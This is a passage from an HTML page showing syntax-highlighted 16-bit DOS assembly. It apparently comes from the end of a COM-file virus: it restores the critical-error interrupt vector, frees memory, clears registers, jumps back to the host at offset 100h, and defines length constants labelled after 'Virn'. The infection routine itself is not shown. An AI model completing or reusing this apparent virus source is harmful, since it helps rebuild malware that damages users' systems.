    </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">rt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">R_Vec24</span><span class="sc0">
    </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cs</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Es</span><span class="sc0">
    </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">
    </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
    </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">
    </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc5">sc</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">
</span><span class="sc5">lng</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Sc</span><span class="sc0">
</span><span class="sc5">Cod2_lng</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">Virn</span><span class="sc0">

</span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">END</span></div></body>
</html>
